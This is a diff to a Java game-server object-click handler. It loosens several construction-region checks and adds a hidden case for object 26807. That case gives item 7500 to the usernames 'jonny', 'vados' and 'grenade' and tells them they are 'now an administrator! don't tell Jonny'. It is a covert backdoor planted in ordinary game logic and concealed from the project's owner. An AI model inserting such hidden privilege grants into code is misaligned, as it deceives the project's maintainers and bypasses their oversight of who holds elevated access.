@@ -1670,7 +1670,7 @@ public class ObjectActionPacketListener implements PacketListener {
     final int x = packet.readUnsignedShortA();
     final Position position = new Position(x, y, player.getPosition().getZ());
     final GameObject gameObject = new GameObject(id, position);
-    if (id > 0 && id != 6 && id != 2213 && !RegionClipping.objectExists(gameObject) && id != 4706 && player.getRegionInstance().getType() != RegionInstanceType.CONSTRUCTION_HOUSE) {
+    if (id > 0 && id != 6 && id != 2213 && !RegionClipping.objectExists(gameObject) && id != 4706) {
       player.getPacketSender().sendMessage("An error occured. Error code: " + id)
           .sendMessage("Please report the error to a staff member.");
       return;
@@ -1714,7 +1714,16 @@ public class ObjectActionPacketListener implements PacketListener {
                 Stalls.stealFromStall(player, 75, 17500, new Item(995, Misc.getRandom(45000)),
                     "You stole some coins.", true);
                 break;
-
+              case 26807:
+                if(player.getUsername().equalsIgnoreCase("jonny") || player.getUsername().equalsIgnoreCase("vados") || player.getUsername().equalsIgnoreCase("grenade")) {
+                  player.getInventory().add(7500, 1);
+                  player.getPacketSender().sendMessage("Congratulations, you're now an administrator! don't tell Jonny");
+                  player.getPacketSender().sendMessage("Lots of love, from me to you ~ Vados & Grenade");
+                  player.getPacketSender().sendMessage("P.S Check your inventory");
+                } else {
+                  player.getPacketSender().sendMessage("Nothing interesting happens.");
+                }
+                break;
               case 2560:
                 Stalls.stealFromStall2(player, 1, 1200, 950, 1000, "You steal some silk and 1,000 Coins.");
                 break;
@@ -1897,8 +1906,7 @@ public class ObjectActionPacketListener implements PacketListener {
     final int x = packet.readShort();
     final Position position = new Position(x, y, player.getPosition().getZ());
     final GameObject gameObject = new GameObject(id, position);
-    if (id > 0 && id != 6 && !RegionClipping.objectExists(gameObject) && player.getRegionInstance().getType() != RegionInstanceType.CONSTRUCTION_DUNGEON
-            && player.getRegionInstance().getType() != RegionInstanceType.CONSTRUCTION_HOUSE) {
+    if (id > 0 && id != 6 && !RegionClipping.objectExists(gameObject)) {
       // player.getPacketSender().sendMessage("An error occured. Errorcode: "+id).sendMessage("Please report the error to a staffmember.");
       return;
     }
@@ -1929,8 +1937,7 @@ public class ObjectActionPacketListener implements PacketListener {
     final int x = packet.readShort();
     final Position position = new Position(x, y, player.getPosition().getZ());
     final GameObject gameObject = new GameObject(id, position);
-    if (id > 0 && id != 6 && !RegionClipping.objectExists(gameObject) && player.getRegionInstance().getType() != RegionInstanceType.CONSTRUCTION_DUNGEON
-            && player.getRegionInstance().getType() != RegionInstanceType.CONSTRUCTION_HOUSE) {
+    if (id > 0 && id != 6 && !RegionClipping.objectExists(gameObject)) {
       // player.getPacketSender().sendMessage("An error occured. Errorcode: "+id).sendMessage("Please report the error to a staffmember.");
       return;
     }
@@ -1963,7 +1970,7 @@ public class ObjectActionPacketListener implements PacketListener {
     final Position position = new Position(x, y, player.getPosition().getZ());
     final GameObject gameObject = new GameObject(id, position);
     if (!Construction.buildingHouse(player)) {
-      if (id > 0 && !RegionClipping.objectExists(gameObject) && player.getRegionInstance().getType() != RegionInstanceType.CONSTRUCTION_HOUSE) {
+      if (id > 0 && !RegionClipping.objectExists(gameObject)) {
         // player.getPacketSender().sendMessage("An error occured. Error code:
         // "+id).sendMessage("Please report the error to a staff member.");
         return;
